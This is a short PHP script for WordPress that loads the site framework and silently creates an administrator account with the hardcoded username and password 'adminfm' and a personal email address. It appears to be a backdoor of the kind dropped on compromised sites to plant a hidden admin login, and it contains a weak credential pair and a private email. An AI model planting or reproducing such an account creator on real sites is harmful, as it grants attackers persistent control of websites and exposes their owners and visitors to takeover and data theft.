<?php
// Load WordPress framework
require_once('wp-load.php');

// Define the username, password, and email for the new admin user
$username = 'adminfm';
$password = 'adminfm';
$email = 'jasonnardinis@gmail.com';

// Check if the user already exists
if (username_exists($username) == null && email_exists($email) == false) {
    // Create a new user
    $user_id = wp_create_user($username, $password, $email);

    // Set the role to administrator
    $user = new WP_User($user_id);
    $user->set_role('administrator');

    echo "Admin user created successfully.";
} else {
    echo "User already exists.";
}
?>
